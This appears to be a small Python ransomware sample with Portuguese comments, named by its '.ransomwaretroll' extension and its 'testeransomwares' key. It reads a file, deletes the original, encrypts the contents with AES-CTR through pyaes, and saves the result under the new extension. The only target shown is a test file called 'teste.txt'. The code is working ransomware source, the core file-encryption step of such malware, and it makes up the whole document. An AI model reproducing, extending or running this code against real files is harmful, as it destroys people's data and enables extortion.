import os
import pyaes

def encrypt_file(file_name, key):
    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criar o objeto AES
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_name = file_name + ".ransomwaretroll"
    with open(encrypted_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    print(f"Arquivo {file_name} criptografado como {encrypted_file_name}")

if __name__ == '__main__':
    file_name = "teste.txt"
    key = b"testeransomwares"  # A chave deve ter 16, 24 ou 32 bytes para AES

    # Criptografar o arquivo
    encrypt_file(file_name, key)
